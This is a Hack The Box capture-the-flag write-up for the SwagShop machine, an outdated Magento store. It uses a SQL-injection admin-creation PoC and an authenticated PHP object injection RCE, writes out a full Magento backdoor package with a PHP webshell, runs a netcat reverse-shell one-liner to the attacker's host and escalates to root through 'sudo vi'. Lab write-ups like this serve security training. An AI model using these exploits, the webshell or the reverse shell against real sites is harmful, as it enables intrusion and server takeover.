---
title: HTB: SwagShop
url: https://0xdf.gitlab.io/2019/09/28/htb-swagshop.html
date: 2019-09-28T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: ctf, hackthebox, htb-swagshop, nmap, magento, gobuster, deserialization, webshell, sudo, oscp-like-v2, oscp-like-v1
---

![SwagShop](https://0xdfimages.gitlab.io/img/swagshop-cover.png)

SwagShop was a nice beginner / easy box centered around a Magento online store interface. I’ll use two exploits to get a shell. The first is an authentication bypass that allows me to add an admin user to the CMS. Then I can use an authenticated PHP Object Injection to get RCE. I’ll also show how got RCE with a malicious Magento package. RCE leads to shell and user. To privesc to root, it’s a simple exploit of `sudo vi`.

## Box Info

| Name | [SwagShop](https://hackthebox.com/machines/swagshop)  [SwagShop](https://hackthebox.com/machines/swagshop) [Play on HackTheBox](https://hackthebox.com/machines/swagshop) |
| --- | --- |
| Release Date | [11 May 2019](https://twitter.com/hackthebox_eu/status/1126230937577172993) |
| Retire Date | 28 Sep 2019 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for SwagShop |
| Radar Graph | Radar chart for SwagShop |
| First Blood User | 00:50:50[evilet evilet](https://app.hackthebox.com/users/8932) |
| First Blood Root | 01:17:40[Lemming Lemming](https://app.hackthebox.com/users/11933) |
| Creator | [ch4p ch4p](https://app.hackthebox.com/users/1) |

## Recon

### nmap

`nmap` shows ssh (tcp 22) and http (tcp 80):

```

root@kali# nmap -sT -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.140                                                                                                            
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-11 15:14 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 50.00% done; ETC: 15:14 (0:00:00 remaining)
Nmap scan report for 10.10.10.140
Host is up (0.100s latency).
Not shown: 63042 filtered ports, 2491 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 65.98 seconds
root@kali# nmap -sC -sV -p 80,22 -oA scans/nmap-scripts 10.10.10.140                                                                                                                   
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-11 15:15 EDT
Nmap scan report for 10.10.10.140
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.60 seconds

```

Based on the ssh and Apache Versions, the host is likely Ubuntu Xenial (16.04).

### Website - TCP 80

#### Site

Site is a Magento store for HTB:

![1557609497532](https://0xdfimages.gitlab.io/img/1557609497532.png)

#### Directory Brute Force

`gobuster` finds a bunch of paths, but all seems related to Magento.

```

root@kali# gobuster  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 50 -o scans/gobuster-root -u http://10.10.10.140/

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.140/
[+] Threads      : 50
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/05/11 15:23:42 Starting gobuster
=====================================================
/index.php (Status: 200)
/media (Status: 301)
/includes (Status: 301)
/install.php (Status: 200)
/lib (Status: 301)
/app (Status: 301)
/js (Status: 301)
/api.php (Status: 200)
/shell (Status: 301)
/skin (Status: 301)
/cron.php (Status: 200)
/var (Status: 301)
/errors (Status: 301)
/downloader (Status: 301)
/mage (Status: 200)
=====================================================
2019/05/11 15:29:57 Finished
===================================================== 

```

#### Version

At the bottom of the page, I notice the copyright date of 2014:

![1568274284636](https://0xdfimages.gitlab.io/img/1568274284636.png)

That’s interesting, as if it’s that old, it should be vulnerable to a lot of exploits. Looing around at common Magento paths, I’ll see a different date on `/index.php/admin/`:

![1568274514407](https://0xdfimages.gitlab.io/img/1568274514407.png)

At `/downloader/`, I see a version number for Magento Connect Manager:

![1568274614559](https://0xdfimages.gitlab.io/img/1568274614559.png)
*Note: `/downloader/` has since been removed from this box, as a way to patch one of the RCE methods.*

I can also check `/RELEASE_NOTES.txt`, but it only gives release notes up to version 1.7.0.2, and then it gives a url to visit for later version release notes, so this isn’t helpful:

![1568274800685](https://0xdfimages.gitlab.io/img/1568274800685.png)

All of this leads me to the conclusion that I don’t really know what version is running, but that I have a hunch that it could be older.

## Shell as www-data

### Add Admin Login

Looking at both Google and `searchsploit`, I’l find a bunch of exploits for Magento. First, I’ll use one called “[shoplift](https://github.com/joren485/Magento-Shoplift-SQLI/blob/master/poc.py)” exploit to add an admin user. I’ll download the python script and run it:

```

root@kali# python poc.py 10.10.10.140
WORKED
Check http://10.10.10.140/admin with creds ypwq:123  

```

I can verify these creds by logging in at http://10.10.10.140/index.php/admin:

![1557609765745](https://0xdfimages.gitlab.io/img/1557609765745.png)

### RCE #1 - PHP Object Injection

Now that I’m authenticated as administer, there’s another exploit that will come in handy that I found with `searchsploit`:

```

root@kali# searchsploit magento
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                                     |  Path
                                                                                                                                                                                   | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scripting                                                                                 | exploits/php/webapps/32808.txt
Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Site Scripting                                                                           | exploits/php/webapps/32809.txt
Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                                                                                                          | exploits/php/webapps/32810.txt
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                                                                                     | exploits/php/webapps/39838.php
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                                                                                                       | exploits/php/webapps/37811.py
Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                                                                                             | exploits/php/webapps/35996.txt
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                                                                                        | exploits/php/webapps/35052.txt
Magento eCommerce - Local File Disclosure                                                                                                                                          | exploits/php/webapps/19793.txt
Magento eCommerce - Remote Code Execution                                                                                                                                          | exploits/xml/webapps/37977.py
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                                                                                       | exploits/php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                                                                                            | exploits/php/webapps/38651.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

After looking through these, the authenticated RCE python script looked the most interesting.

For background on this bug, it’s a PHP Object Injection vulnerability, detailed by one of the researchers who found it [here](https://websec.wordpress.com/2014/12/08/magento-1-9-0-1-poi/). PHP Object Injection is a class of bugs that falls under deserialization vulnerabilities. Basically, the server passes a php object into the page, and when the browser submits back to the server, it sends that object as a parameter. To prevent evil users from messing with the object, Magento uses a keyed hash to ensure integrity. However, the key for the hash is the install data, which can be retrieved from `/app/etc/local.xml`. This means that once I have that date, I can forge signed objects and inject my own code, which leads to RCE.

I’ll make a copy of the POC from `searchsploit`:

```

root@kali# searchsploit -m exploits/php/webapps/37811.py
  Exploit: Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution
      URL: https://www.exploit-db.com/exploits/37811
     Path: /usr/share/exploitdb/exploits/php/webapps/37811.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /root/hackthebox/swagstore-10.10.10.140/37811.py

```

I’ll rename to `magento_rce.py`, and open it up and take a look. In the config section, I’ll have to update 3 fields:

```

# Config.
username = 'ypwq'
password = '123'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml

```

I got the date from the page as suggested:

```

root@kali# curl -s 10.10.10.140/app/etc/local.xml | grep date
            <date><![CDATA[Wed, 08 May 2019 07:23:09 +0000]]></date>

```

When I run it, I get an error:

```

root@kali# python magento_rce.py http://10.10.10.140 "uname -a"
Traceback (most recent call last):
  File "magento_rce.py", line 56, in <module>
    br['login[password]'] = password
  File "/usr/lib/python2.7/dist-packages/mechanize/_form.py", line 2780, in __setitem__
    control = self.find_control(name)
  File "/usr/lib/python2.7/dist-packages/mechanize/_form.py", line 3101, in find_control
    return self._find_control(name, type, kind, id, label, predicate, nr)
  File "/usr/lib/python2.7/dist-packages/mechanize/_form.py", line 3185, in _find_control
    raise ControlNotFoundError("no control matching "+description)
mechanize._form.ControlNotFoundError: no control matching name 'login[password]'

```

`mechanize` is a scriptable browser, and it’s complaining that there’s not login form with a password field. That’s because it’s trying to log into the base of the site. I’ll run it again, this time with the admin login page:

```

root@kali# python magento_rce.py 'http://10.10.10.140/index.php/admin' "uname -a"
Linux swagshop 4.4.0-146-generic #172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

```

### RCE #2 - Magento Package

When the box was released, there was a second way to get RCE via uploading a Magento package. It seems this method has been patched in the current instance of the box, as `/download` is not longer there. I’ll show how I did it anyway, but you will not be able to replicate this part today.

#### From GitHub

[This GitHub](https://github.com/lavalamp-/LavaMagentoBD) has a template for a malicious Magento package. I’ll download lavalamp\_magento\_bd.tgz, and upload it via http://10.10.10.140/downloader/:

![1557662974804](https://0xdfimages.gitlab.io/img/1557662974804.png)

Now I can use the webshell it installs:

```

root@kali# curl -d 'c=id' http://10.10.10.140/index.php/lavalamp/index
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

#### From Scratch

[This post](https://dustri.org/b/writing-a-simple-extensionbackdoor-for-magento.html) gives a good walkthrough for creating a malicious Magento package. I’ll create two files in the following structure:

```

root@kali# tree .
.
├── errors
│   └── cmd.php
└── package.xml

1 directory, 2 files

```

`cmd.php`:

```

<?php system($_REQUEST['cmd']); ?>

```

`package.xml`:

```

<?xml version="1.0"?>
<package>
<name>backdoor</name>
<version>1.3.3.7</version>
<stability>devel</stability>
<licence>backdoor</licence>
<channel>community</channel>
<extends/>
<summary>Backdoor for magento</summary>
<description>Backdoor for magento</description>
<notes>backdoor</notes>
<authors>
    <author>
        <name>jvoisin</name>
        <user>jvoisin</user>
        <email>julien.voisin@dustri.org</email>
    </author>
</authors>
<date>2015-08-17</date>
<time>13:47:49</time>
<contents>
    <target name="mage">
        <dir>
            <dir name="errors">
                <file name="cmd.php" hash="c214a2fb80bab315fc328a5eff2892b5"/>
            </dir>
        </dir>
    </target>
</contents>
<compatible/>
<dependencies>
    <required>
        <php>
            <min>5.2.0</min>
            <max>6.0.0</max>
        </php>
    </required>
</dependencies>
</package>

```

It is important that the hash is created correctly for the php file as follows:

```

root@kali# md5sum errors/cmd.php 
c214a2fb80bab315fc328a5eff2892b5  errors/cmd.php

```

Now I’ll use `tar` to package it up:

```

root@kali# tar -czvf package.tgz errors/ package.xml 
errors/
errors/cmd.php
package.xml
root@kali# ls
errors  package.tgz  package.xml

```

And upload the `tgz` file, and I have RCE through a webshell:

```

root@kali# curl http://10.10.10.140/errors/cmd.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Shell

With either RCE, I can upgrade to a legit shell:

```

root@kali# python magento_rce.py 'http://10.10.10.140/index.php/admin' "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 9001 >/tmp/f"

```

```

root@kali# nc -lnvp 9001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.140.
Ncat: Connection from 10.10.10.140:41828.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

From there I can grab `user.txt`:

```

$ cat user.txt 
a4488772...

```

## Privesc to root

### Shell Upgrade

Now that I have a shell, I’ll upgrade it to a full tty which will allow me to run commands like `su` and `vi`, as well as tab completion and arrow keys. I don’t show this on every writeup, but I certainly do it every time I get a shell on Linux.

It’s difficult to show because the terminal gets cleared, but the steps are:
1. `python -c 'import pty;pty.spawn("/bin/bash")'`. `python3` works as well.
2. Ctrl-z to background shell. At local prompt, `stty raw -echo`.
3. `fg` to bring shell back to front.
4. `reset` to reinitialize the terminal. If prompted for Terminal type, enter `screen`.
5. In reset shell, `export TERM=screen`.

I can also use `stty -a` on my local shell to see the rows and columns. Then I can set it for the remote shell by running `stty rows [#rows] columns [#columns]`. This will allow things like `vi` or `less` to use the full screen.

### Enumeration

`sudo -l` shows I can run `sudo` with no password on `vi` in the web dir:

```

www-data@swagshop:/home/haris$ sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*

```

### Read Flag

The fastest path to the flag is just to open it with `vi`. Based on the `sudo` output above, I’ll run:

```

www-data@swagshop:/$ sudo /usr/bin/vi /var/www/html/../../../root/root.txt

```

```

c2b087d6...

   ___ ___
 /| |/|\| |\
/_| ´ |.` |_\           We are open! (Almost)
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!
~
~
~
~
~
~
~
~
~
~
~
~
~
"/var/www/html/../../../root/root.txt" 10L, 270C

```

### Shell

Of course I want a shell. I’ll open a non-existing file with `www-data@swagshop:/home/haris$ sudo /usr/bin/vi /var/www/html/a` .

[GTFOBins’ vi page](https://gtfobins.github.io/gtfobins/vi/) tells me how to get a shell from here:

```

:set shell=/bin/sh
:shell

```

I’ll use bash, but otherwise the same:

![](https://0xdfimages.gitlab.io/img/swagstore-root.gif)

`wc -c root.txt` returns 270, but that’s because there’s an extra message with the flag:

```

root@swagshop:/home/haris# cat /root/root.txt 
c2b087d6...

   ___ ___
 /| |/|\| |\
/_| ´ |.` |_\           We are open! (Almost)
  |   |.  |
  |   |.  |         Join the beta HTB Swag Store!
  |___|.__|       https://hackthebox.store/password

                   PS: Use root flag as password!

```

### More Direct Shell

I can also use the other example on [GTFOBins](https://gtfobins.github.io/gtfobins/vi/), and get a shell from the command line:

```

www-data@swagshop:/var/www/html$ sudo vi /var/www/html/a -c ':!/bin/sh'

```

The formatting gets a bit wild on my shell making it difficult to show here, but it does return a root shell.